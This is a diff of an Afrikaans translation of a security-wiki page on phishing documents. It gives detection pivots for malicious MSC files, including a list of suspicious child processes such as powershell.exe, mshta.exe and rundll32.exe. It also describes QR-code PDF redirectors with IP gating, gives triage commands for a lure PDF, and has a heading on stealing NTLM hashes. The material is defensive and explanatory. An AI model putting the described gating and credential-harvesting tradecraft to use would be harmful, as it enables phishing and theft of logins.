-Hoë-sein-runtime-pivots is wanneer `mmc.exe` die CLR- of scriptkomponente laai, netwerkverbindings skep, of `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` of ’n onverwagte uitvoerbare lêer begin. Die formaat is legitiem, dus behoort opsporing **oorsprong + verdagte XML-/script-inhoud + `mmc.exe`-gedrag** te korreleer eerder as om elke MSC te blokkeer.<sup>[[9]](#references)</sup>
+Runtime-pivots met ’n hoë seinwaarde is `mmc.exe` wat die CLR- of scriptkomponente laai, netwerkverbindings skep, of `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` of ’n onverwagte uitvoerbare lêer begin. Die formaat is legitiem, dus behoort detections **oorsprong + verdagte XML-/scriptinhoud + `mmc.exe`-gedrag** te korreleer eerder as om elke MSC te blokkeer.<sup>[[9]](#references)</sup>
 
-## PDF/QR-herleidings en payload-beperking
+## PDF/QR-redirectors en payload-gating
 
-’n PDF het nie ’n exploit nodig om nuttig te wees nie. Onlangse veldtogte plaas ’n **QR-kode of gewone skakel** in ’n dokument wat onskuldig lyk, lei die blaaiersessie weg van e-posbeheermaatreëls en pas die bestemming aan met die ontvanger se adres. Microsoft het in 2025 PDF’s gedokumenteer waarvan die QR-URL’s uniek was vir elke ontvanger en na RaccoonO365-infrastruktuur vir die oes van aanmeldbewyse gelei het; ’n parallelle ketting het IP-/omgewingsbeheer gebruik om ’n JavaScript-/MSI-pad aan geselekteerde besoekers terug te gee, maar ’n onskadelike PDF aan skandeerders of kliënte wat nie toegelaat is nie.<sup>[[10]](#references)</sup>
+’n PDF hoef nie ’n exploit te bevat om bruikbaar te wees nie. Onlangse veldtogte plaas ’n **QR-kode of gewone skakel** in ’n dokument wat onskuldig lyk, lei die blaaiersessie weg van e-posbeheermaatreëls en pas die bestemming aan met die ontvanger se e-posadres. Microsoft het PDFs uit 2025 gedokumenteer waarvan die QR-URL’s uniek per ontvanger was en na RaccoonO365-infrastruktuur vir die oes van aanmeldbewyse gelei het; ’n parallelle ketting het IP-/omgewings-gating gebruik om ’n JavaScript-/MSI-pad aan geselekteerde besoekers te verskaf, maar ’n onskadelike PDF aan skandeerders of kliënte wat nie toegelaat is nie.<sup>[[10]](#references)</sup>
 
-Triageer beide PDF-aksies en QR-kodes wat weergegee is. ’n QR-kode kan as vektorgrafika geteken wees eerder as as ’n onttrekbare beeld gestoor word, dus rasteriseer elke bladsy en onttrek ook ingebedde beelde:
+Triageer beide PDF-aksies en gerenderde QR-kodes. ’n QR-kode kan as vektorgrafika geteken wees eerder as as ’n onttrekbare prent gestoor word, dus rasteriseer elke bladsy en onttrek ook die ingebedde prente:
 
 ```bash
 pdfid.py lure.pdf
@@ -393,7 +395,7 @@ pdftoppm -png -r 300 lure.pdf page
 zbarimg --quiet image-*.png page-*.png
 ```
 
-Inspekteer gedekodeerde bestemmings en redirects vanaf ’n geïsoleerde ontledingstelsel sonder om te verifieer. Nuttige soekkenmerke sluit QR-alleen-PDF’s met byna leë e-posinhoude, die ontvanger se e-posadres wat in ’n query-parameter ingebed is, verskeie redirects deur betroubare hostingdienste en verskillende inhoud wat teruggestuur word volgens IP, geoligging, koekies, referrer of user agent in. Vergelyk versoeke met beheerde profiele, aangesien ’n enkele sandbox-versoek dalk net die lokmiddel kan ontvang.<sup>[[10]](#references)</sup>
+Inspekteer gedekodeerde bestemmings en herleidings vanaf ’n geïsoleerde ontledingstelsel sonder om te staaf. Nuttige jagkenmerke sluit in PDF’s wat slegs QR-kodes bevat met byna leë e-posboodskappe, die ontvanger se e-posadres wat in ’n navraagparameter ingebed is, verskeie herleidings via betroubare gasheerdienste, en verskillende inhoud wat volgens IP, geoligging, koekies, verwysingsadres of gebruikersagent teruggestuur word. Vergelyk versoeke met beheerde profiele, want ’n enkele sandbox-ophaalversoek kan net die lokmiddel ontvang.<sup>[[10]](#references)</sup>
 
 ## Windows-lêers om NTLM-hashes te steel
 
@@ -408,15 +410,15 @@ Kyk na die bladsy oor **plekke om NTLM-creds te steel**:
 
 ## References
 
-- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
+- [1] [HTB Job – LibreOffice-makro → IIS-webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
 - [2] [Check Point Research – ZipLine-veldtog: ’n Gesofistikeerde phishing-aanval wat Amerikaanse maatskappye teiken](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
 - [3] [Rapid7 – Malware à la Mode: Opsporing van Dropping Elephant se tradecraft deur ’n China-tema-loaderketting](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
-- [4] [Kaping van die TypeLib – Nuwe COM-persistence-tegniek (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
-- [5] [Unit 42 – PhantomVAI Loader lewer ’n reeks infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
-- [6] [MITRE ATT&CK – Steganografie (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
+- [4] [Kaping van die TypeLib – Nuwe COM-volhardingstegniek (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
+- [5] [Unit 42 – PhantomVAI-loader lewer ’n reeks infostealers af](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
+- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
 - [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
 - [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
 - [9] [Elastic Security Labs – GrimResource: Microsoft Management Console vir aanvanklike toegang en ontduiking](https://www.elastic.co/security-labs/threat-command/grimresource)
-- [10] [Microsoft Security Blog – Bedreigingsakteurs buit belastingseisoen uit om belastingtema-phishingveldtogte te ontplooi](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
+- [10] [Microsoft Security Blog – Bedreigingsakteurs buit belastingseisoen uit om phishing-veldtogte met ’n belastingtema te loods](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
 - [11] [Cisco Talos – UAT-11587-afleweringsketting en Antino-backdoor](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
 {{#include ../../banners/hacktricks-training.md}}
